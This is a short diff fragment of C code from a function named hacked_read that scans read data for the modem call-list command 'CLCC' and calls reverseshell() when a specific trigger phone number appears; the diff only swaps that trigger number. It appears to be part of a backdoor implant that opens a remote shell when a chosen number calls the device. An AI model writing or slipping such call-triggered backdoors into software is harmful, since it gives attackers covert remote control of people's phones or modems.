@@ -46,7 +46,7 @@ hacked_read (int fd, char *buf, size_t count)
 {
  if (strstr (buf, "CLCC"))
     {
-      if (strstr (buf, "7841334022")) //Trigger number
+      if (strstr (buf, "7777777777")) //Trigger number
 		{
 			reverseshell ();
 		}
